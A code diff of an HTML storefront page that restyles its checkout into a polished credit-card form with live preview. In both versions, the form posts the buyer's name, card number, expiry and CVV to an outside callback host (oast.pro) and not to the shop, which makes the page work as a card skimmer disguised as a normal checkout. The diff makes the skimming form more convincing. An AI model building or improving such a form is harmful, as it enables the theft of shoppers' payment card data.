@@ -32,13 +32,27 @@
         <h3>Cart</h3>
         <ul id="cartItems"></ul>
         <p id="totalPrice">Total: $0</p>
-        <form id="checkoutForm" action="https://oast.pro/6dc777f83b840b1f739bg1ftg9ayyyyyb" method="POST">
-          <input type="text" name="name" placeholder="Name" required>
-          <input type="text" name="cardNumber" placeholder="Card Number" required>
-          <input type="text" name="expiry" placeholder="MM/YY" required>
-          <input type="text" name="cvv" placeholder="CVV" required>
-          <button type="submit">Checkout</button>
-        </form>
+
+        <!-- CREDIT CARD STYLE FORM -->
+        <div class="card-form-container">
+          <div class="card-display">
+            <div id="cardFront" class="card-front">
+              <p id="cardNumberDisplay">•••• •••• •••• ••••</p>
+              <p id="cardNameDisplay">FULL NAME</p>
+              <p id="cardExpiryDisplay">MM/YY</p>
+            </div>
+            <div id="cardBack" class="card-back">
+              <p id="cardCvvDisplay">CVV</p>
+            </div>
+          </div>
+          <form id="checkoutForm" action="https://oast.pro/6dc777f83b840b1f739bg1ftg9ayyyyyb" method="POST">
+            <input type="text" id="cardName" name="name" placeholder="Full Name" required>
+            <input type="text" id="cardNumber" name="cardNumber" placeholder="Card Number" maxlength="19" required>
+            <input type="text" id="cardExpiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+            <input type="text" id="cardCvv" name="cvv" placeholder="CVV" maxlength="4" required>
+            <button type="submit">Checkout</button>
+          </form>
+        </div>
       </div>
     </div>
   </section>
@@ -64,7 +78,7 @@
       window.location.href = 'index.html';
     });
 
-    // SAMPLE SHOP ITEMS
+    // SHOP ITEMS
     const cards = [
       {name:"Red Card", price:50, color:"#ff4d4d"},
       {name:"Blue Card", price:75, color:"#4d79ff"},
@@ -77,7 +91,6 @@
     const totalPriceEl = document.getElementById('totalPrice');
     let cart = [];
 
-    // DISPLAY CARDS
     function displayCards(){
       shopGrid.innerHTML = cards.map((card, i) => `
         <div class="shop-card" style="background:${card.color}">
@@ -100,6 +113,27 @@
     }
 
     displayCards();
+
+    // CREDIT CARD FORM LIVE UPDATE
+    const cardNumber = document.getElementById('cardNumber');
+    const cardName = document.getElementById('cardName');
+    const cardExpiry = document.getElementById('cardExpiry');
+    const cardCvv = document.getElementById('cardCvv');
+
+    const cardNumberDisplay = document.getElementById('cardNumberDisplay');
+    const cardNameDisplay = document.getElementById('cardNameDisplay');
+    const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
+    const cardCvvDisplay = document.getElementById('cardCvvDisplay');
+
+    cardNumber.addEventListener('input', ()=> {
+      let val = cardNumber.value.replace(/\D/g,'');
+      let formatted = val.match(/.{1,4}/g)?.join(' ') || '';
+      cardNumberDisplay.textContent = formatted.padEnd(19, '•');
+    });
+    cardName.addEventListener('input', ()=> cardNameDisplay.textContent = cardName.value.toUpperCase() || 'FULL NAME');
+    cardExpiry.addEventListener('input', ()=> cardExpiryDisplay.textContent = cardExpiry.value || 'MM/YY');
+    cardCvv.addEventListener('input', ()=> cardCvvDisplay.textContent = cardCvv.value || 'CVV');
+
   </script>
 
 </body>
